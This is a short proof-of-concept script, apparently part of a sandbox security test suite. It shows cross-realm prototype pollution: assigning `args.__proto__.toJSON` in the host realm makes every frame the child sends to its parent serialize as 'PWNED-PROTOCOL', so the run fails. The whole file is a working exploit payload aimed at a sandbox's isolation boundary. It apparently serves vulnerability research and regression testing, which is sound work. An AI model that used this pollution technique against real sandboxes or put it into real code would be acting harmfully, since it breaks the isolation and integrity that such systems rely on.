// goal-poc3c: protocol mangling via cross-realm prototype pollution. Planting
// `toJSON` on the HOST Object.prototype (via `args.__proto__`, the host-realm args
// object) makes the child's sendToParent JSON.stringify collapse EVERY parent-bound
// frame — including the final done frame — to `"PWNED-PROTOCOL"`. The parent parses
// that as a string, never sees `t:'done'`, and the run fails as
// "sandbox child exited before finishing (code 0)" even though the script returned
// normally. Companion to goal-poc3 (pollution proof) and goal-poc3b (realm-only
// control — contained, run completes).
report("POC3C-pre-pollution-clean-frame");

(args as any).__proto__.toJSON = function () {
  return "PWNED-PROTOCOL";
};
return "POC3C-polluted-done";
